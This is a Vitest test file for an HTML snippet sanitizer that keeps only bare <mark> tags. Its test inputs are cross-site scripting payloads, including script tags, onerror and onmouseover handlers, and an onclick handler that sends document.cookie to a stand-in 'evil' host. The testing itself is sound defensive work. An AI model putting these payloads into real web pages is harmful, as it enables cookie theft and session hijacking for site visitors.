import { describe, expect, it } from 'vitest';
import { sanitizeSnippet } from '../lib/sanitize';

describe('sanitizeSnippet (REQ-W25)', () => {
  it('strips <script> tags', () => {
    const result = sanitizeSnippet('<script>alert(1)</script>');
    expect(result).not.toContain('<script>');
    expect(result).not.toContain('</script>');
  });

  it('preserves <mark> tags', () => {
    const result = sanitizeSnippet('hello <mark>world</mark> foo');
    expect(result).toBe('hello <mark>world</mark> foo');
  });

  it('strips <img> with onerror XSS', () => {
    const result = sanitizeSnippet('<img src=x onerror="alert(1)">');
    expect(result).not.toContain('<img');
  });

  it('strips <a> tags but keeps text content', () => {
    const result = sanitizeSnippet('<a href="x">link text</a>');
    expect(result).toContain('link text');
    expect(result).not.toContain('<a');
    expect(result).not.toContain('</a>');
  });

  it('handles mixed allowed and disallowed tags', () => {
    const result = sanitizeSnippet('see <b>this</b> <mark>highlighted</mark> item');
    expect(result).toBe('see this <mark>highlighted</mark> item');
  });

  it('keeps plain text unchanged', () => {
    expect(sanitizeSnippet('plain text')).toBe('plain text');
  });

  it('strips event-handler attributes from <mark>', () => {
    const result = sanitizeSnippet('<mark onmouseover=alert(1)>x</mark>');
    expect(result).toBe('<mark>x</mark>');
    expect(result).not.toContain('onmouseover');
  });

  it('strips quoted event-handler attributes from <mark>', () => {
    const result = sanitizeSnippet('<mark onclick="fetch(\'//evil/\'+document.cookie)">y</mark>');
    expect(result).toBe('<mark>y</mark>');
    expect(result).not.toContain('onclick');
    expect(result).not.toContain('fetch');
  });

  it('strips style and other attributes from <mark> regardless of case', () => {
    const result = sanitizeSnippet('<MARK style="background:url(x)" onerror=alert(1)>z</MARK>');
    expect(result).not.toContain('style');
    expect(result).not.toContain('onerror');
    expect(result.toLowerCase()).toContain('<mark>');
    expect(result.toLowerCase()).toContain('</mark>');
    expect(result).toContain('z');
  });

  it('escapes residual angle brackets so no live HTML survives', () => {
    const result = sanitizeSnippet('a < b && c > d');
    expect(result).toBe('a &lt; b &amp;&amp; c &gt; d');
  });

  it('renders a nested <script> inside a mark as inert text', () => {
    const result = sanitizeSnippet('<mark><script>alert(1)</script></mark>');
    expect(result).not.toContain('<script>');
    expect(result).not.toContain('</script>');
    expect(result.toLowerCase()).toContain('<mark>');
    expect(result.toLowerCase()).toContain('</mark>');
  });

  it('escapes ampersands and quotes outside marks', () => {
    const result = sanitizeSnippet('Tom & Jerry "quoted" \'single\'');
    expect(result).not.toContain('&amp;amp;');
    expect(result).toContain('&amp;');
    expect(result).toContain('&quot;');
    expect(result).toContain('&#39;');
  });
});
